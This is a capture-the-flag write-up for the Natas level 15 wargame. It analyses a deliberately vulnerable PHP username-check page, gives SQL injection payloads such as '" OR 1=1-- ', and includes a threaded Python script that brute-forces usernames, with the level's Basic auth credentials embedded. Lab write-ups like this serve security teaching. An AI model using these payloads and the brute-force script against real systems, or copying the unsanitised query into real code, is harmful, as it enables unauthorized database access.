# Level 15

## Software used
- Google Chrome + FoxyProxy
- Burpsuite Community
- [onlinephp.io](https://onlinephp.io/)

## Hint
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

## Solution

### Code Analysis

```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
```
It is actually a comment but it may be useful since it gives us a clue about the maximum length of usernames and passwords, and that the default value if NULL.  
[VARCHAR](https://dev.mysql.com/doc/refman/8.0/en/char.html): The CHAR and VARCHAR types are similar, but differ in the way they are stored and retrieved. They also differ in maximum length and in whether trailing spaces are retained.  
[MYSQL DEFAULT VALUE](https://dev.mysql.com/doc/refman/8.0/en/data-type-defaults.html)
```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');
```
If key _username_ exists in the special array $\_REQUEST, then connect to the database _natas15_ on localhost (local to the server) using the username _natas15_ and password... which is censored.  

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }
```
Create the variable $query which holds the actual SQL query to be sent to the backend database.  

```php
$res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

The variable $res holds the response from the backend database:
- if the number of rows ([mysqli_num_rows](https://www.php.net/manual/en/mysqli-result.num-rows.php)) is greater than 0, then prints to screen ""This user exists.\<br>"
- if the number of rows is 0 or a negative integer, then prints "This user doesn't exist.\<br>"
- if the result is everything else, prints "Error in query.\<br>"

At the end of the script, the connection to the database is closed.

## Exploit

Injecting the payload `" OR 1=1-- ` the app prints to screen **This user exists.**. By contrast, using the payload `" OR 1=2-- ` we get **This user doesn't exist.**.
```php
<?php

$array = array(
	
	"username" => '" OR 1=1-- ',
	/*"password" => '" OR 1=1-- ',*/
);

$query = "SELECT * from users where username=\"".$array["username"]."\"";

echo $query

?>
_____

SELECT * from users where username="" OR 1=1-- "
```

Bruteforcing the webapp using the following script* we found out the **alice** is a valid username.

```python
import requests
import sys
import urllib3
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# PROXY ALL REQUESTS THROUGH BURP
proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def postRequest(s, target_url, username):
    # DEFINE ARGUMENTS TO SEND ALONG THE POST REQUEST
    params = {
        'username' : username
    }

    headers = {
        'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='
    }

    # SEND REQUEST
    r = s.post(target_url, headers=headers, data=params, verify=False, proxies=proxies)

    # CHECK IF USERNAME IS VALID
    if "This user exists." in r.text:
        return username, r.status_code



def main():
    if len(sys.argv) != 2:
        print("[-] Wrong number of arguments!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()

    target_url = url + '/index.php'
    usernames = []
    
    # LOAD USERNAMES IN A LIST
    with open(r'.\usernames.txt', 'r') as file:
        print("[+] Loading all usernames in a list...")
        for line in file.readlines():
            username = line.strip()
            sys.stdout.write("[+] Added username %s\r" % username)
            sys.stdout.flush()
            sys.stdout.write("\033[K")
            usernames.append(username)
        
    how_many_usernames = len(usernames)
    print("[+] All set! %i usernames loaded" % how_many_usernames)

    # START THREADED EXECUTION
    with ThreadPoolExecutor (max_workers=5) as executor:
        future_to_url = {executor.submit(postRequest, s, target_url, username) for username in usernames}
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                
                    data = future.result()
                    if data:
                        print(data[0], data[1])
                

            except Exception as exc:
                print("[-] Error: %s" % exc)

if __name__ == "__main__":
    main()
```

*This script is _raw_, it is fast but you need to kill the process to stop it.

